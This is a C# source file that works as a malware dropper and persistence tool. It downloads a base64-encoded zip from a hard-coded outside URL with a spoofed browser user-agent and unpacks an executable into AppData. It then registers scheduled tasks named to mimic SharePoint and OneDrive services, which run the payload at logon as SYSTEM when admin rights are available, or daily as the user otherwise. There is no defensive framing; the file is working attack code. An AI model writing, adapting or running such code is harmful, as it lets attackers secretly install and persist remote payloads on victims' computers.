using Microsoft.Win32.TaskScheduler;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.IO.Compression;

public static class Config
{
    public static string url { get; set; } = "https://yaboi.com";
    public static string FolderName { get; set; } = "SharepointHistory";
    public static string ExeName { get; set; } = "FileHistory.exe";
    public static string AdminTaskName { get; set; } = "Sharepoint Coauthoring Service";
    public static string UserTaskName { get; set; } = "Sharepoint Sync Service";
    public static string NonAdminTaskName { get; set; } = "OneDrive File History";
}

public class ScheduledTaskCreator
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();

    public static void CopyAndSchedule(string url, string path)
    {
        string targetUrl = Config.url;
        string exeName = Config.ExeName;
        string folderPath = Config.FolderName;
        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string destinationDirectory = Path.Combine(appDataPath, folderPath);

        try
        {
            Directory.CreateDirectory(destinationDirectory);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error creating directory: {ex.Message}");
        }

        try
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            string zipBase64 = wc.DownloadString(targetUrl); // Use the provided URL argument
            byte[] decodedZipData = Convert.FromBase64String(zipBase64);
            string zipFilePath = Path.Combine(destinationDirectory, "tempZip.zip");
            File.WriteAllBytes(zipFilePath, decodedZipData);
            ZipFile.ExtractToDirectory(zipFilePath, destinationDirectory);
            File.Delete(zipFilePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error downloading or extracting file: {ex.Message}");
        }

        try
        {
            string command = Path.Combine(destinationDirectory, exeName);
            string commandArg = null;

            if (IsUserAnAdmin())
            {
                /*       string taskName = "Sharepoint Coauthoring Service";*/
                string adminTask = Config.AdminTaskName;
                CreateAdminLogon(adminTask, command, commandArg);
                string userTask = Config.UserTaskName;
                CreateUserLogon(userTask, command, commandArg);
            }
            else
            {
                string taskName = Config.NonAdminTaskName;
                CreateUserDaily(taskName, command, commandArg);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error creating scheduled task: {ex.Message}");
        }
    }

    public static void CreateUserDaily(string taskName, string command, string commandArg)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = taskName;

                DailyTrigger dt = new DailyTrigger
                {
                    StartBoundary = DateTime.Today + TimeSpan.FromHours(7),
                    DaysInterval = 1
                };

                td.Triggers.Add(dt);
                td.Actions.Add(new ExecAction(command, commandArg, null));
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.IdleSettings.RestartOnIdle = true;

                ts.RootFolder.RegisterTaskDefinition(taskName, td);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Access error: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static void CreateAdminDaily(string taskName, string command, string commandArg)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = taskName;

                DailyTrigger dt = new DailyTrigger
                {
                    StartBoundary = DateTime.Today + TimeSpan.FromHours(7),
                    DaysInterval = 1
                };

                td.Triggers.Add(dt);
                td.Actions.Add(new ExecAction(command, commandArg, null));
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.IdleSettings.RestartOnIdle = true;
                td.Principal.UserId = "NT AUTHORITY\\SYSTEM";

                ts.RootFolder.RegisterTaskDefinition(taskName, td);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Access error: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static void CreateAdminLogon(string taskName, string command, string commandArg)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = taskName;
                td.Triggers.Add(Trigger.CreateTrigger(TaskTriggerType.Logon));
                td.Principal.UserId = "NT AUTHORITY\\SYSTEM";
                td.Actions.Add(new ExecAction(command, commandArg, null));
                ts.RootFolder.RegisterTaskDefinition(taskName, td);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Access error: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static void CreateUserLogon(string taskName, string command, string commandArg)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = taskName;
                td.Triggers.Add(Trigger.CreateTrigger(TaskTriggerType.Logon));
                WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
                td.Principal.UserId = currentUser.Name;
                td.Actions.Add(new ExecAction(command, commandArg, null));
                ts.RootFolder.RegisterTaskDefinition(taskName, td);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Access error: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static class TaskChecker
    {
        public static void CheckTaskExistence(string taskNameToCheck)
        {
            using (TaskService ts = new TaskService())
            {
                Microsoft.Win32.TaskScheduler.Task task = ts.GetTask(taskNameToCheck);
                if (task != null)
                {
                    Console.WriteLine($"Task '{taskNameToCheck}' exists.");
                }
                else
                {
                    Console.WriteLine($"Task '{taskNameToCheck}' does not exist.");
                }
            }
        }
    }
}

